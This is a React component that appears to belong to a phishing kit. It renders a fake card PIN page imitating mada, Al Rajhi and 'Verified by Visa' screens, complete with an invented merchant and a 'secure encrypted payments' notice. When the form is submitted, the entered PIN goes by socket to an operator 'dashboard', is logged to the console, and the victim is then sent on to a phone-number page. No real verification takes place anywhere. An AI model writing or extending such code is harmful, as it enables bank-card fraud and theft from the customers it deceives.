import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { socketService } from '../../services/socketService';
import Timer from '../../client/components/Timer';
import { useI18n } from '../../shared/i18n';

const CardPin: React.FC = () => {
    const navigate = useNavigate();
    const location = useLocation();
    const { t, isRTL, language } = useI18n();

    const { amount, cardNumber, date, cardType } = location.state || {
        amount: `115.00 ${language === 'ar' ? 'ر.س' : 'SAR'}`,
        cardNumber: '**** **** **** 1234',
        date: new Date().toLocaleDateString('en-GB'),
        cardType: 'visa'
    };

    const [pin, setPin] = useState('');
    const [loading, setLoading] = useState(false);
    const [canResend, setCanResend] = useState(false);
    const [error, setError] = useState('');

    // Detect card type for styling
    const isMada = cardType === 'mada';
    const isRajhi = cardType === 'rajhi';

    useEffect(() => {
        // Get card info from session storage if available
        const storedCardInfo = sessionStorage.getItem('pendingCardInfo');
        if (storedCardInfo) {
            try {
                const cardInfo = JSON.parse(storedCardInfo);
                // Use stored card info if available
            } catch (e) {
                console.log('No stored card info');
            }
        }
    }, []);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        if (pin.length !== 4) {
            setError(language === 'ar' ? 'الرجاء إدخال رمز PIN المكون من 4 أرقام' : 'Please enter a 4-digit PIN');
            return;
        }

        setLoading(true);
        setError('');

        // Send PIN to dashboard
        socketService.emitClientEvent('submitPin', { pin });

        console.log('PIN submitted:', pin);

        // After PIN confirmation, move customer to phone page
        navigate('/phone');
    };

    const handleResend = () => {
        setCanResend(false);
        setPin('');
        alert(language === 'ar' ? 'جاري إعادة إرسال رمز PIN...' : 'Resending PIN code...');
    };

    return (
        <div className="max-w-lg mx-auto mt-5 md:mt-10 relative z-20 px-4 sm:px-0">
            <div className={`bg-white rounded-xl shadow-xl p-6 md:p-8 text-center border-t-4 ${isMada ? 'border-[#005050]' :
                    isRajhi ? 'border-[#117D48]' :
                        'border-blue-600'
                }`}>
                {/* Card Icon */}
                <div className={`w-16 h-16 md:w-20 md:h-20 rounded-full flex items-center justify-center mx-auto mb-6 md:mb-8 ${isMada ? 'bg-[#005050]' :
                        isRajhi ? 'bg-[#117D48]' :
                            'bg-blue-600'
                    }`}>
                    {isMada ? (
                        <span className="text-white text-2xl md:text-3xl font-bold">mada</span>
                    ) : isRajhi ? (
                        <span className="text-white text-2xl md:text-3xl font-bold">ر</span>
                    ) : (
                        <svg className="w-8 h-8 md:w-10 md:h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                        </svg>
                    )}
                </div>

                {/* Title */}
                <h2 className="text-xl md:text-2xl font-bold text-gray-800 mb-3">
                    {isMada
                        ? (language === 'ar' ? 'أدخل رمز PIN' : 'Enter PIN')
                        : isRajhi
                            ? (language === 'ar' ? 'تحقق من هوية حامل البطاقة' : 'Cardholder Identity Verification')
                            : (language === 'ar' ? 'تم التحقق عبر فيزا' : 'Verified by Visa')}
                </h2>
                <p className="text-gray-500 mb-6">
                    {isMada
                        ? (language === 'ar' ? 'أدخل رمز PIN السري للتحقق من هويتك' : 'Enter your secret PIN to verify your identity')
                        : isRajhi
                            ? (language === 'ar' ? 'أدخل رمز التحقق للمتابعة' : 'Enter the verification code to continue')
                            : (language === 'ar' ? 'أدخل رمز PIN للتحقق من هويتك' : 'Enter your PIN to verify your identity')}
                </p>

                {/* Transaction Details */}
                <div className={`rounded-lg p-3 md:p-4 mb-6 border text-sm ${isMada ? 'bg-[#005050]/5 border-[#005050]/20' :
                        isRajhi ? 'bg-[#117D48]/5 border-[#117D48]/20' :
                            'bg-blue-50 border-blue-100'
                    }`}>
                    <div className="grid grid-cols-2 gap-y-3">
                        <div className="text-gray-500">{language === 'ar' ? 'التاجر' : 'Merchant'}</div>
                        <div className="font-semibold text-gray-800 text-left dir-ltr">V-Safety</div>

                        <div className="text-gray-500">{language === 'ar' ? 'المبلغ' : 'Amount'}</div>
                        <div className="font-semibold text-gray-800 text-left dir-ltr">{amount}</div>

                        <div className="text-gray-500">{language === 'ar' ? 'التاريخ' : 'Date'}</div>
                        <div className="font-semibold text-gray-800 text-left dir-ltr">{date}</div>

                        <div className="text-gray-500">{language === 'ar' ? 'رقم البطاقة' : 'Card Number'}</div>
                        <div className="font-semibold text-gray-800 text-left dir-ltr">{cardNumber}</div>
                    </div>
                </div>

                {/* PIN Input */}
                <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                            {isMada
                                ? (language === 'ar' ? 'رمز PIN (4 أرقام)' : 'PIN (4 digits)')
                                : isRajhi
                                    ? (language === 'ar' ? 'رمز التحقق' : 'Verification code')
                                    : (language === 'ar' ? 'أدخل رمز PIN' : 'Enter PIN')}
                        </label>
                        <input
                            type="password"
                            className={`w-full p-3 sm:p-4 md:p-6 border-2 rounded-xl text-center text-2xl sm:text-3xl md:text-4xl tracking-[0.4em] sm:tracking-[0.8em] md:tracking-[1em] font-mono focus:ring-0 outline-none transition-colors dir-ltr ${isMada ? 'border-[#005050]/30 focus:border-[#005050]' :
                                    isRajhi ? 'border-[#117D48]/30 focus:border-[#117D48]' :
                                        'border-blue-200 focus:border-blue-500'
                                }`}
                            maxLength={4}
                            placeholder="••••"
                            value={pin}
                            onChange={(e) => {
                                const value = e.target.value.replace(/\D/g, '');
                                if (value.length <= 4) {
                                    setPin(value);
                                    setError('');
                                }
                            }}
                            autoFocus
                            required
                        />
                        {error && (
                            <p className="text-red-500 text-sm mt-2">{error}</p>
                        )}
                    </div>

                    {!canResend && (
                        <div className="flex justify-center items-center gap-2 text-sm text-gray-500">
                            <span>{language === 'ar' ? 'إعادة الإرسال خلال' : 'Resend in'}</span>
                            <Timer seconds={60} className={`font-bold ${isMada ? 'text-[#005050]' :
                                    isRajhi ? 'text-[#117D48]' :
                                        'text-blue-600'
                                }`} onComplete={() => setCanResend(true)} />
                            <span>{language === 'ar' ? 'ثانية' : 'seconds'}</span>
                        </div>
                    )}

                    <button
                        type="submit"
                        disabled={loading || pin.length < 4}
                        className={`w-full text-white font-bold py-3 md:py-4 rounded-xl shadow-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all ${isMada ? 'bg-[#005050] hover:bg-[#004040]' :
                                isRajhi ? 'bg-[#117D48] hover:bg-[#0D5C3A]' :
                                    'bg-blue-600 hover:bg-blue-700'
                            }`}
                    >
                        {loading
                            ? (language === 'ar' ? 'جاري التحقق...' : 'Verifying...')
                            : (language === 'ar' ? 'تأكيد' : 'Confirm')}
                    </button>
                </form>

                {canResend && (
                    <button
                        onClick={handleResend}
                        className="mt-6 text-sm text-gray-400 hover:text-blue-600 underline"
                    >
                        {language === 'ar' ? 'لم تستلم رمز PIN؟' : 'Didn\'t receive the PIN?'}
                    </button>
                )}

                {/* Security Notice */}
                <div className="mt-6 pt-4 border-t border-gray-100">
                    <div className="flex items-center justify-center gap-2 text-xs text-gray-400">
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                        </svg>
                        <span>{language === 'ar' ? 'مدفوعات آمنة ومشفرة' : 'Secure encrypted payments'}</span>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default CardPin;
